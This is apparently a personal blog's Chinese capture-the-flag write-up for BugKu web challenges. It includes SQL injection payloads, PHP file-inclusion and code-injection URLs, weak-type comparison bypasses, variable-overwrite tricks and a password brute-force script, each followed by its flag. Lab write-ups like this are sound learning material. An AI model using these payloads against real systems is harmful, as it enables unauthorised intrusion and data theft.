@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		 
+			
+  
+    <meta name="twitter:card" content="summary"/>
+    
+      <meta name="twitter:image" content="https://yang1k.github.io/images/avatar.png" />
+    
+  
+  
+  <meta name="twitter:title" content="BugKu web部分(一)"/>
+  <meta name="twitter:description" content="偶然发现的练习一个平台
+"/>
+  
+  
+  
+  
+    <meta name="twitter:creator" content="@Yang1k"/>
+  
+
+
+
+		
+		<meta name="author" content="Yang1k">
+		<meta name="description" content="Site Description">
+		<meta name="generator" content="Hugo 0.56.0" />
+		<title>BugKu web部分(一) &middot; Yang1k</title>
+		<link rel="shortcut icon" href="https://yang1k.github.io/images/favicon.ico">
+		<link rel="stylesheet" href="https://yang1k.github.io/css/style.css">
+		<link rel="stylesheet" href="https://yang1k.github.io/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="https://yang1k.github.io/css/font-awesome.min.css">
+		
+
+		
+		<link href="https://yang1k.github.io/index.xml" rel="alternate" type="application/rss+xml" title="Yang1k" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='https://yang1k.github.io/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='https://yang1k.github.io/post'>Archive</a>
+	<a href='https://yang1k.github.io/tags'>Tags</a>
+	<a href='https://yang1k.github.io/about'>About</a>
+
+	
+
+	
+	<a class="" href="https://yang1k.github.io/index.xml">RSS</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        BugKu web部分(一)
+                    </h1>
+                    <h2 class="headline">
+                    Dec 15, 2017 09:54
+                    · 495 words
+                    · 3 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="https://yang1k.github.io/tags/ctf">ctf</a>
+                          
+                              <a href="https://yang1k.github.io/tags/python">python</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#文件上传测试">文件上传测试</a></li>
+<li><a href="#矛盾">矛盾</a></li>
+<li><a href="#web3">Web3</a></li>
+<li><a href="#sql注入">sql注入</a></li>
+<li><a href="#sql注入1">SQL注入1</a></li>
+<li><a href="#本地包含">本地包含</a></li>
+<li><a href="#变量1">变量1</a></li>
+<li><a href="#web4">web4</a></li>
+<li><a href="#web5">web5</a></li>
+<li><a href="#flag在index里">flag在index里</a></li>
+<li><a href="#输入密码查看flag">输入密码查看flag</a></li>
+<li><a href="#前女友">前女友</a></li>
+<li><a href="#javascript">JavaScript</a></li>
+<li><a href="#成绩单">成绩单</a></li>
+<li><a href="#web6">web6</a></li>
+<li><a href="#各种绕过哟-web7">各种绕过哟(web7)</a></li>
+<li><a href="#web8">web8</a></li>
+<li><a href="#考细心">考细心</a></li>
+<li><a href="#flag-php">flag.php</a></li>
+<li><a href="#这是一个神奇的登陆框">这是一个神奇的登陆框</a></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    <p>偶然发现的练习一个<a href="http://123.206.31.85">平台</a>
+<!-- more --></p>
+
+<h3 id="文件上传测试">文件上传测试</h3>
+
+<p>抓取上传的数据包，测试后发现后台是检查文件内容的，上传一个图片，抓包修改后缀为php即可</p>
+
+<pre><code>Flag:42e97d465f962c53df9549377b513c7e
+</code></pre>
+
+<h3 id="矛盾">矛盾</h3>
+
+<p>源码</p>
+
+<pre><code>$num=$_GET['num'];
+if(!is_numeric($num))
+{
+echo $num;
+if($num==1)
+echo 'flag{**********}';
+}
+</code></pre>
+
+<p>php弱类型，刚开始想到传入一个true，但是不行，因为传参的时候，传入的参数是字符型的，只有bool型的true才符合条件，最后传的参是1admin</p>
+
+<p>(<a href="https://yangzcc.github.io/2017/11/08/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/#more">https://yangzcc.github.io/2017/11/08/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/#more</a>)</p>
+
+<pre><code>flag{bugku-789-ps-ssdf}
+</code></pre>
+
+<h3 id="web3">Web3</h3>
+
+<p>flag就在这里快来找找吧</p>
+
+<p>打开链接就一直弹弹弹，于是写脚本最后一串这样的字符</p>
+
+<pre><code>&lt;!--&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--&gt;
+</code></pre>
+
+<p>ascii码，解码就好了。</p>
+
+<pre><code>KEY{J2sa42ahJK-HS11III}
+</code></pre>
+
+<h3 id="sql注入">sql注入</h3>
+
+<p>测试可知为宽字节</p>
+
+<pre><code>http://103.238.227.13:10083/index.php?id=1%df' and updatexml(1,concat(0x7e,(select mid(string,10,30) from sql5.key where id=1),0x7e),1) --+
+</code></pre>
+
+<p>查出为</p>
+
+<pre><code>54f3320dc261f313ba712eb3f13a1f6d
+</code></pre>
+
+<p>MD5解密为‘gbk!#@’但其实不用解密的才是flag。</p>
+
+<pre><code>KEY{54f3320dc261f313ba712eb3f13a1f6d}
+
+</code></pre>
+
+<h3 id="sql注入1">SQL注入1</h3>
+
+<p>给出的部分代码</p>
+
+<pre><code>//过滤sql
+$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');
+foreach ($array as $value)
+{
+	if (substr_count($id, $value) &gt; 0)
+	{
+		exit('包含敏感关键字！'.$value);
+	}
+}
+
+//xss过滤
+$id = strip_tags($id);
+
+$query = &quot;SELECT * FROM temp WHERE id={$id} LIMIT 1&quot;;
+</code></pre>
+
+<p>substr_count函数是区分大小写的，所以尝试大小写绕过，但是平台还是可以检测到，在本地测试，发现大小写确实可以绕过substr_count函数，很奇怪。</p>
+
+<p>再去看strip_tags函数，发现它可以去掉html代码，于是payload如下。</p>
+
+<pre><code>http://103.238.227.13:10087/index.php?id=-1 UN&lt;&gt;ION SELE&lt;&gt;CT 1,group_concat(hash) fro&lt;&gt;m sql3.key wh&lt;&gt;ere id=1 --+
+</code></pre>
+
+<p>可能平台给出的是部分代码，还有其他代码对大写的也进行过滤了。</p>
+
+<pre><code>KEY{c3d3c17b4ca7f791f85e#$1cc72af274af4adef}
+</code></pre>
+
+<h3 id="本地包含">本地包含</h3>
+
+<p>构造payload</p>
+
+<pre><code>http://120.24.86.145:8003/index.php?hello=ss);include 'php://filter/read=convert.base64-encode/resource=flag.php';var_dump(ss
+</code></pre>
+
+<p>不知道为什么下面这个payload不能使用。本地测试都可以</p>
+
+<pre><code>http://120.24.86.145:8003/index.php?hello=ss);echo file_get_contents('flag.php'); var_dump(ss
+
+</code></pre>
+
+<pre><code>flag{bug-ctf-gg-99}
+</code></pre>
+
+<h3 id="变量1">变量1</h3>
+
+<p>源码</p>
+
+<pre><code>flag In the variable ! &lt;?php  
+
+error_reporting(0);
+include &quot;flag1.php&quot;;
+highlight_file(__file__);
+if(isset($_GET['args'])){
+    $args = $_GET['args'];
+    if(!preg_match(&quot;/^\w+$/&quot;,$args)){
+        die(&quot;args error!&quot;);
+    }
+    eval(&quot;var_dump($$args);&quot;);
+}
+?&gt;
+</code></pre>
+
+<p>payload</p>
+
+<pre><code>http://120.24.86.145:8004/index1.php?args=GLOBALS
+</code></pre>
+
+<p>利用的是全局变量globals，2017高校运维出过的。</p>
+
+<pre><code>flag{92853051ab894a64f7865cf3c2128b34}
+</code></pre>
+
+<h3 id="web4">web4</h3>
+
+<p>查看源代码后发现一串js代码，粘贴到本地运行可以得到</p>
+
+<pre><code>function checkSubmit(){var a=document.getElementById(&quot;password&quot;);if(&quot;undefined&quot;!=typeof a){if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)return!0;alert(&quot;Error&quot;);a.focus();return!1}}document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;
+</code></pre>
+
+<p>将 67d709b2b54aa2aa648cf6e87a7114f1 提交即可</p>
+
+<pre><code>KEY{J22JK-HS11}
+</code></pre>
+
+<h3 id="web5">web5</h3>
+
+<p>把编码放进控制台运行即可。</p>
+
+<pre><code>ctf{whatfk}
+</code></pre>
+
+<h3 id="flag在index里">flag在index里</h3>
+
+<p>右键查看源码就感觉这是一个文件包含。
+payload</p>
+
+<pre><code>http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php
+</code></pre>
+
+<p>解码得</p>
+
+<pre><code>error_reporting(0);
+    if(!$_GET[file]){echo '&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;';}
+    $file=$_GET['file'];
+    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){
+        echo &quot;Oh no!&quot;;
+        exit();
+    }
+    include($file); 
+//flag:flag{edulcni_elif_lacol_si_siht}
+</code></pre>
+
+<pre><code>flag{edulcni_elif_lacol_si_siht}
+</code></pre>
+
+<h3 id="输入密码查看flag">输入密码查看flag</h3>
+
+<p>爆破脚本</p>
+
+<pre><code>#coding=utf-8
+import requests
+import itertools
+
+def url(pwd):
+    url = 'http://120.24.86.145:8002/baopo/?yes'
+    header = {
+        'User-Agent': 'Xlcteam Browser',
+    }
+    data = {'pwd':pwd}
+    r = requests.post(url,headers=header,data=data)
+    return len(r.content.decode('utf-8'))
+
+
+str1='1234567890'
+str2 = itertools.product(str1,repeat=5)
+
+for x in str2:
+    pwd = ''.join(x)
+    if url(pwd)!=1140:
+        print pwd
+        break
+</code></pre>
+
+<pre><code>flag{bugku-baopo-hah}
+</code></pre>
+
+<h3 id="前女友">前女友</h3>
+
+<p>右键发现code.txt，访问得</p>
+
+<pre><code>&lt;?php
+if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3'])){
+    $v1 = $_GET['v1'];
+    $v2 = $_GET['v2'];
+    $v3 = $_GET['v3'];
+    if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2)){
+        if(!strcmp($v3, $flag)){
+            echo $flag;
+        }
+    }
+}
+?&gt;
+</code></pre>
+
+<p>弱类型绕过</p>
+
+<p>构造的参数为</p>
+
+<pre><code>v1 = QNKCDZO
+v2 = s878926199a
+v3[]=1
+</code></pre>
+
+<pre><code>SKCTF{Php_1s_tH3_B3St_L4NgUag3}
+</code></pre>
+
+<h3 id="javascript">JavaScript</h3>
+
+<p>f12查看js代码，可以看到有一段js代码如下</p>
+
+<pre><code>&lt;script&gt;
+    var clicks=0
+    $(function() {
+      $(&quot;#cookie&quot;)
+        .mousedown(function() {
+          $(this).width('350px').height('350px');
+        })
+        .mouseup(function() {
+          $(this).width('375px').height('375px');
+          clicks++;
+          $(&quot;#clickcount&quot;).text(clicks);
+          if(clicks &gt;= 1000000){
+            var form = $('&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;' +
+                        '&lt;input type=&quot;text&quot; name=&quot;clicks&quot; value=&quot;' + clicks + '&quot; hidden/&gt;' +
+                        '&lt;/form&gt;');
+                        $('body').append(form);
+                        form.submit();
+          }
+        });
+    });
+  &lt;/script&gt;
+</code></pre>
+
+<p>最后有一个form表单，于是想着构造一个post请求</p>
+
+<pre><code>http://120.24.86.145:9001/test/
+
+post数据 clicks=1000000
+</code></pre>
+
+<pre><code>flag{Not_C00kI3Cl1ck3r}
+</code></pre>
+
+<h3 id="成绩单">成绩单</h3>
+
+<p>sql注入</p>
+
+<p>payload</p>
+
+<pre><code>http://120.24.86.145:8002/chengjidan/index.php
+post数据  id=-1' union select 1,2,3,skctf_flag  from fl4g #
+</code></pre>
+
+<pre><code>BUGKU{Sql_INJECT0N_4813drd8hz4}
+</code></pre>
+
+<h3 id="web6">web6</h3>
+
+<p>题目提示一定要快，抓包可以发现响应包中的藏有flag，但是需要base64解码，直接提交不对，又有提示说</p>
+
+<pre><code>我都说了让你快点。。。&lt;/br&gt;我感觉你得快点!!!&lt;!-- OK ,now you have to post the margin what you find --&gt;
+</code></pre>
+
+<p>所以猜想是获得第一个响应包时就将响应头的flag解码，然后在提交，于是写脚本，写完提交发现不对。。想了好久，还是看了writeup明白原来是需要将将响应包的flag进行两次base64解码。。。。。</p>
+
+<p>我的脚本</p>
+
+<pre><code>#coding=utf-8
+import requests
+import base64
+import string
+def url(pwd):
+	url = 'http://120.24.86.145:8002/web6/'
+	header = {
+    'Cookie': 'PHPSESSID=leiuk6pke6rpnqoqpg9n84fv8qbtn635',
+	}
+	data = {'margin':pwd}
+	r = requests.post(url,headers=header,data=data)
+	print r.content.decode('utf-8')
+	a = base64.b64decode(r.headers['flag'])
+	b = base64.b64decode(a.split(' ',1)[1:2][0])
+	return b
+pwd = 'ODA0NTM='
+pwd2 = url(pwd)
+url(pwd2)
+
+</code></pre>
+
+<p>大神的脚本</p>
+
+<pre><code>#coding:utf-8
+import requests,base64
+import re
+url='http://120.24.86.145:8002/web6/'
+s=requests.Session()
+content = s.post(url)
+html = content.headers['flag']
+flag  = base64.b64decode(base64.b64decode(html)[-8:])
+#print flag
+data = {'margin':flag}
+content = s.post(url,data=data)
+print content.text
+</code></pre>
+
+<p>虽然只有六行的差距，但是两个脚本水平一眼就知道。。</p>
+
+<h3 id="各种绕过哟-web7">各种绕过哟(web7)</h3>
+
+<p>给的源码</p>
+
+<pre><code>&lt;?php
+highlight_file('flag.php');
+$_GET['id'] = urldecode($_GET['id']);
+$flag = 'flag{xxxxxxxxxxxxxxxxxx}';
+if (isset($_GET['uname']) and isset($_POST['passwd'])) {
+    if ($_GET['uname'] == $_POST['passwd'])
+
+        print 'passwd can not be uname.';
+
+    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin'))
+
+        die('Flag: '.$flag);
+
+    else
+
+        print 'sorry!';
+
+}
+</code></pre>
+
+<p>但在第二处判断时由于sha1()函数无法处理数组类型，将报错并返回false，MD5也存在这种漏洞
+所以构造payload</p>
+
+<pre><code>http://120.24.86.145:8002/web7/?id=%256dargin&amp;uname[]=QNKCDZO
+
+post：passwd[]=Qjh
+</code></pre>
+
+<pre><code>flag{HACK_45hhs_213sDD}
+</code></pre>
+
+<h3 id="web8">web8</h3>
+
+<p>源码</p>
+
+<pre><code>&lt;?php
+extract($_GET);
+if (!empty($ac))
+{
+$f = trim(file_get_contents($fn));
+if ($ac === $f)
+{
+echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;;
+}
+else
+{
+echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;;
+}
+}
+?&gt;
+</code></pre>
+
+<p>extract函数会造成变量覆盖</p>
+
+<p>file_get_contents的php://input写法可以构造$f的参数</p>
+
+<p>payload</p>
+
+<pre><code>http://120.24.86.145:8002/web8/?ac=aa&amp;fn=php://input
+
+post：aa
+</code></pre>
+
+<pre><code>flag{3cfb7a90fc0de31}
+</code></pre>
+
+<h3 id="考细心">考细心</h3>
+
+<p>传参x=admin即可。。。。</p>
+
+<pre><code>flag(ctf_0098_lkji-s)
+
+</code></pre>
+
+<h3 id="flag-php">flag.php</h3>
+
+<p>传入一个hint=0即可得到源码。。。。。。这种很无聊。。</p>
+
+<p>构造的cookie</p>
+
+<pre><code>Cookie: ISecer=s:0:&quot;&quot;;
+</code></pre>
+
+<p>因为代码的$KEY在后面。。。。</p>
+
+<pre><code>flag{unserialize_by_virink}
+</code></pre>
+
+<h3 id="这是一个神奇的登陆框">这是一个神奇的登陆框</h3>
+
+<p>一个双引号的报错注入，</p>
+
+<p>payload</p>
+
+<pre><code>http://120.24.86.145:9001/sql/
+
+post数据
+admin_name=1&quot; and extractvalue(1,concat(0x7e,(select mid(flag1,15,20) from flag1),0x7e)) # &amp;admin_passwd=&quot;sdmasd
+</code></pre>
+
+<p>注出来的数据</p>
+
+<pre><code>ed6b28e684817d9efcaf802979e57aea
+</code></pre>
+
+<p>直接提交就好，不用解密</p>
+
+<pre><code>flag{ed6b28e684817d9efcaf802979e57aea}
+</code></pre>
+                </section>
+            </article>
+
+            
+                <a class="twitter" href="https://twitter.com/intent/tweet?text=https%3a%2f%2fyang1k.github.io%2ftypecho%2fpost%2fctf%25E7%25BB%2583%25E4%25B9%25A0%25E5%25B9%25B3%25E5%258F%25B0-1%2f - BugKu%20web%e9%83%a8%e5%88%86%28%e4%b8%80%29 "><span class="icon-twitter"> tweet</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'your_disqus_short_name'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+    <p class="small">
+    
+       © Copyright 2020 <i class="fa fa-heart" aria-hidden="true"></i> Yang1k
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="https://yang1k.github.io/js/jquery-3.3.1.min.js"></script>
+<script src="https://yang1k.github.io/js/main.js"></script>
+<script src="https://yang1k.github.io/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'your_google_analytics_id', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+    </body>
+</html>
